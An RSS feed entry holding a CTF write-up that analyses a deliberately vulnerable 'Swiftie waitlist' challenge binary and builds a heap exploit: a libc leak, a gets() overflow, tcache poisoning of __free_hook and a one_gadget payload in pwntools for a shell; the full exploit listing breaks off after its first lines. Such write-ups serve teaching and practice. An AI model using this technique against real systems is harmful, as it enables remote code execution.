<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>CTF Writeups on enxgmatic&#39;s hidey hole</title>
        <link>https://enxgmatic.github.io/ctf/</link>
        <description>Recent content in CTF Writeups on enxgmatic&#39;s hidey hole</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-gb</language>
        <copyright>enxgmatic</copyright>
        <lastBuildDate>Sat, 10 Feb 2024 19:21:04 +0800</lastBuildDate>
        <atom:link href="https://enxgmatic.github.io/ctf/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]</title>
            <link>https://enxgmatic.github.io/ctf/whitehacks/</link>
            <pubDate>Sun, 31 Mar 2024 17:43:43 +0800</pubDate>
            
            <guid>https://enxgmatic.github.io/ctf/whitehacks/</guid>
            <description>Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup] Description Solves: 2
To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&amp;rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?
By GovTech
nc ctf2.whitehats.site 2005
Initial Analysis $ ./checksec waitlist Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled ------ $ .</description>
            <content type="html"><![CDATA[<h1 id="whitehacks-2024---the-swiftie-waitlist-pwn-writeup">Whitehacks 2024 - The Swiftie Waitlist [Pwn Writeup]</h1>
<h2 id="description">Description</h2>
<p><em>Solves: 2</em></p>
<p>To deal with the overwhelming demand for the recent Swiftie concert, a waitlist system was enacted to handle the overcapacity problem. However, it&rsquo;s been made aware that the program was vulnerable, and some fanatic fans have even exploited it to skip the waitlist entirely. Just how did they do it?</p>
<p>By GovTech</p>
<p><code>nc ctf2.whitehats.site 2005</code></p>
<h2 id="initial-analysis">Initial Analysis</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ./checksec waitlist
</span></span><span class="line"><span class="cl">Arch:     amd64-64-little
</span></span><span class="line"><span class="cl">RELRO:    Full RELRO
</span></span><span class="line"><span class="cl">Stack:    Canary found
</span></span><span class="line"><span class="cl">NX:       NX enabled
</span></span><span class="line"><span class="cl">PIE:      PIE enabled
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">------
</span></span><span class="line"><span class="cl">$ ./waitlist
</span></span><span class="line"><span class="cl">Welcome to the ticket portal <span class="k">for</span> the Swiftie concert. Unfortunately, due to overwhelming demand, our tickets are all sold out. However, <span class="k">if</span> you still wish to try <span class="k">for</span> a chance to obtain one, please join our waitlist.
</span></span><span class="line"><span class="cl">Here is the <span class="nb">exit</span> passcode to leave the waitlist should you change your mind: <span class="m">140456273802736</span>
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">1. Join the waitlist
</span></span><span class="line"><span class="cl">2. View the waitlist
</span></span><span class="line"><span class="cl">3. Leave the waitlist
</span></span><span class="line"><span class="cl">4. Exit
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></div><p>Decompiling the binary in Ghidra, the <code>main()</code> function simply lets us choose between 3 options: joining the waitlist [<code>add()</code>], viewing the waitlist [<code>delete()</code>] and leaving the waitlist [<code>view()</code>].</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">undefined4</span> <span class="n">local_18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ignore_me_init_buffering</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="s">&#34;Welcome to the ticket portal for the Swiftie concert. Unfortunately, due to overwhelming dema nd, our tickets are all sold out. However, if you still wish to try for a chance to obtain one , please join our waitlist.&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Here is the exit passcode to leave the waitlist should you change your mind: %llu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">exit</span><span class="p">);</span> <span class="c1">// leaks the address of exit()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">local_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">local_18</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d18</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 4, aka exit */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="nf">__stack_chk_fail</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* prints out the options */</span>
</span></span><span class="line"><span class="cl">        <span class="n">local_14</span> <span class="o">=</span> <span class="nf">getOption</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* when we pick option 2, aka to view the waitlist */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">view</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="cm">/* when we pick option 3, aka leave the waitlist */</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="k">goto</span> <span class="n">code_r0x00100c7b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Queue #: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_00100e9c</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">getchar</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">delete</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* when we pick option 1, aka join the waitlist */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d0c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nl">code_r0x00100c7b</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">local_14</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LAB_00100d0c</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You are not supposed to be here!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">goto</span> <span class="n">LAB_00100d18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Already, this is pretty reminiscent of a typical Create, View, Edit and Delete heap challenge, though interestingly without an Edit option.</p>
<p>Additionally, we are given the address of <code>exit()</code>, which means we can obtain the libc base address (since ASLR is enabled).</p>
<br>
<p>Let&rsquo;s check out <code>add()</code> first, which runs when we pick option 1 to join the waitlist:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span> <span class="c1">// Allocate a chunk
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The binary will allocate a fixed size chunk (using <code>malloc(0x18)</code>) to indicate a queue number in the waitlist. The chunk will take on the value of <code>name</code>, which we can control based on our input.</p>
<figure>
<img src="assets/waitlist.png">
<figcaption>In this case, our chunk is allocated to the address `0x555555604260`. Our chunk holds the value `HELLOTHERE`, which is the name that I had input.</figcaption>
</figure>
<p>Also to take note, while inputting <code>name</code>, the <code>gets()</code> function is used, which is vulnerable to buffer overflow (sus).</p>
<p>Afterwards, the pointer to the chunk is added to the waitlist, which is an array of max size 10.</p>
<figure>
<img src="assets/waitlist (2).png" width=75%>
<figcaption>The first element of waitlist holds the value of 0x555555604260, which is the address of the chunk at queue number 0.</figcaption>
</figure>
<br>
<p>Moving on to <code>delete()</code>, which is option 3 (leaving the waitlist):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">delete</span><span class="p">(</span><span class="n">uint</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(((</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">param_1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You have forfeited your queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">param_1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The function lets us free a chunk, based on the index on the waitlist. However, after freeing, the chunk isn&rsquo;t cleared (the pointer isn&rsquo;t set to NULL).</p>
<br>
<p>Finally, let&rsquo;s check out <code>view()</code>, which is option 4 (viewing the waitlist):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">view</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">param_1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="n">param_1</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Invalid index!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[</span><span class="n">param_1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Not much to say, we are able to view the value of a chunk based on the index.</p>
<h2 id="obtaining-libc-leak">Obtaining libc leak</h2>
<p>As mentioned above, the binary directly gives us the address of <code>exit()</code>.</p>
<p>Additionally, libc 2.27 was provided as part of the challenge. Using this, we can calculate the libc base address.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;change your mind: &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exit</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;exit:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">exit</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">exit</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">exit</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc_base:&#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span></code></pre></div><p>Now&hellip; moving on to the heap stuff :)</p>
<h2 id="a-short-introduction-to-heap--stuff">A Short Introduction to Heap &amp; Stuff</h2>
<p>When we use <code>malloc(size)</code> to allocate a chunk, a chunk of size rounded to the next 0x10 will be allocated in the heap.</p>
<br>
<p>The chunk consists of 2 parts - the metadata, and the user data:</p>
<ul>
<li>The first 0x8 bytes is the <code>mchunk_prev_size</code>
<ul>
<li>This only applies if an adjacent chunk is free</li>
<li>Otherwise, this 0x8 bytes will be used as part of the previous chunk&rsquo;s user data</li>
</ul>
</li>
<li>The next 0x8 bytes represents the size of the chunk <code>mchunk_size</code>
<ul>
<li>The last 3 bits are used as &ldquo;flags&rdquo;, which is left as an exercise to the reader to find out</li>
</ul>
</li>
<li>Finally, the rest is user data of the minimum <code>size</code> requested</li>
</ul>
<figure class="full">
  <img src="assets/waitlist (4).png" width=60%>
  <figcaption class="center">Credits to pwn.college</figcaption>
</figure>
<p>Let&rsquo;s demonstrate it for this binary. I have allocated a chunk with the <code>name</code> value: <code>BBBBB</code>.</p>
<ul>
<li>Using <code>heap chunks</code> in gdb, we can see that the chunk is at the address 0x555555604260
<ul>
<li>Note: this address is where our user data starts (<code>mem_addr</code> in the image above). <code>chunk_addr</code> is 0x555555604260-0x10=0x555555604250.</li>
</ul>
</li>
<li>The green box represents the <code>mchunk_prev_size</code> (not relevant in this case)</li>
<li>The orange box represents <code>mchunk_size</code>, which is 0x20
<ul>
<li>It writes 0x21 due to the abovementioned flags</li>
</ul>
</li>
<li>The red box represents the user data (<code>0x4242424242</code> = <code>BBBBB</code>)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (3).png">
<figcaption></figcaption>
</figure>
<p>What happens when we free the chunk? In this case, the chunk will enter tcache.</p>
<p>The tcache is a singly linked list. Each tcache entry will point to the next entry in the list (eg in the diagram below, A points to B). When we use <code>malloc</code> to allocate a new chunk, the latest entry that entered tcache will be used (so it is a last-in-first-out LIFO system).</p>
<figure class="full">
<img src="assets/waitlist (6).png" width=60%>
<figcaption>Credits to pwn.college</figcaption>
</figure>
<p>Structure of a tcache entry:</p>
<ul>
<li>the first 0x8 bytes <code>next</code> is the address of the next entry (or NULL if no next entry)</li>
<li>the next 0x8 bytes is the <code>key</code> (unimportant here, left as an exercise to the reader)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (5).png" width=60%>
<figcaption>Credits to pwn.college</figcaption>
</figure>
<p>Let&rsquo;s go back to our example using the binary. We free the chunk by choosing option 3 and deleting the queue number 0.</p>
<p>Going back to the same address, we see that our user data is now gone. Instead, we have:</p>
<ul>
<li>The address of the next entry (red box), which is null because there is no next entry.</li>
<li>The key (green box)</li>
</ul>
<figure class="full">
<img src="assets/waitlist (7).png">
<figcaption></figcaption>
</figure>
<p>Let&rsquo;s try another situation. Restart the binary and join the waitlist twice (queue #0 and queue #1). Then, leave the waitlist for both of them.</p>
<p>In this case, we allocated 2 chunks and then freed both of them.</p>
<figure class="full">
<img src="assets/waitlist (8).png">
<figcaption>(Prior to leaving the waitlist): Two chunks have been allocated. The first one has value AAAAA and the second one has value BBBBB.</figcaption>
</figure>
<p>After leaving the waitlist (ie freeing the chunks), here&rsquo;s the new heap layout:</p>
<ul>
<li>The red boxes indicate the next entry, and green boxes indicate the key for each entry</li>
<li>We can see that for the first entry, the next entry value is null</li>
<li>However for the second entry, the next entry value is the address of the first entry</li>
</ul>
<figure class="full">
<img src="assets/waitlist (9).png">
<figcaption></figcaption>
</figure>
<p>With this knowledge, how can we exploit this?</p>
<h2 id="heap-overflow">Heap overflow</h2>
<p>As mentioned earlier, there is a buffer overflow vulnerability in <code>add()</code> due to <code>gets()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">add</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__s</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">__s</span><span class="p">);</span> <span class="c1">// Vulnerable to buffer overflow
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">listSize</span> <span class="o">=</span> <span class="n">listSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">&amp;</span><span class="n">waitlist</span><span class="p">)[(</span><span class="kt">int</span><span class="p">)</span><span class="n">listSize</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;You are now in queue #%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">listSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;ERROR: Waitlist is maxed out.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s spam a bunch of characters in the name field and see what happens.</p>
<pre tabindex="0"><code>Scenario: 
1. Join the waitlist (queue #0) with name A*0x8
2. Join the waitlist (queue #1) with name B*0x8
3. Join the waitlist (queue #2) with name C*0x8
4. Leave the waitlist (queue #1)
5. Join the waitlist (queue #3, which is at the location of queue #1
        due to tcache LIFO system) with name D*0x30
6. View queue #2
</code></pre><p>After step 4:</p>
<figure class="full">
<img src="assets/waitlist (10).png" width=90%>
<figcaption></figcaption>
</figure>
<p>After step 5:</p>
<figure class="full">
<img src="assets/waitlist (11).png">
<figcaption>We have overflowed queue #3, and have edited the chunk at queue #2</figcaption>
</figure>
<p>After step 6: we obtained a SIGSEGV. This means that from overflowing queue #3 into queue #2, we were able to successfully edit the chunk at queue #2 (hence crashing the binary).</p>
<p>Thus, this acts as a proof of concept of heap overflow in the binary, in which we can overflow values to and hence control the next chunk.</p>
<p>So how can we take advantage of this to get a shell?</p>
<h2 id="obtaining-shell">Obtaining Shell</h2>
<p>Through googling, I learnt that if I could allocate a chunk at <code>__free_hook</code>, I would be able to obtain a shell.</p>
<p>How can I control the location of a chunk though?</p>
<pre tabindex="0"><code>Scenario:
1. Join the waitlist 3 times (queue #0, #1, #2)
2. Leave the waitlist 3 times in the order of queue #0, #2, #1
</code></pre><p>After step 2:</p>
<figure class="full">
<img src="assets/waitlist (14).png">
<figcaption></figcaption>
</figure>
<p>When we next join the waitlist, queue #3 will take the position of queue #1 due to tcache&rsquo;s LIFO system.  In this case, can&rsquo;t we overflow into queue #2, editing the next tcache entry of queue #2 (red box) and changing it to <code>__free_hook</code> instead?</p>
<br>
<pre tabindex="0"><code>Scenario (cont):
3. Join the waitlist (queue #3) and edit the &#34;next tcache entry&#34; of queue #2
</code></pre><p>We need to fill in the metadata of queue #2&rsquo;s chunk correctly to prevent the binary from crashing.</p>
<ul>
<li>Use <code>b'A'*0x18</code> to fill the user input buffer of queue #3 (since our input starts at the blue box)</li>
<li><code>b'\x21' + b'\x00'*7</code> ensures that <code>mchunk_size</code> of queue #2 maintains as 0x21</li>
<li><code>p64(libc.symbols['__free_hook'])</code> overwrites next tcache entry to <code>__free_hook</code> (ensure that libc base is accounted for in this address)</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x21</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">])</span>
</span></span></code></pre></div><p>As such, we have successfully overwrote the tcache next entry value of queue #2. That means the next chunk allocated after allocating the chunk at queue #2 will take the location of <code>__free_hook</code>!</p>
<pre tabindex="0"><code>Scenario (cont):
4. Join the waitlist (queue #4, in position queue #2) and fill the name as anything
5. Join the waitlist (queue #5, at the location of __free_hook) and fill the name using one_gadget
6. Leave the waitlist (queue #5)
7. Profit :)
</code></pre><p>To explain why <code>__free_hook</code> works to get a shell:</p>
<ul>
<li><code>__free_hook</code> is called whenever <code>free()</code> is used.</li>
<li><a href="https://github.com/david942j/one_gadget">one_gadget</a> is a nifty programme to get RCE from one gadget.</li>
<li>By replacing <code>__free_hook</code> with one_gadget, our RCE gadget will instead be called whenever <code>free()</code> is used</li>
<li>Thus, by deleting a chunk (using option 4), the one_gadget will proc, leading to shell :D</li>
</ul>
<h2 id="full-exploit">Full exploit</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">local</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./waitlist_patched&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
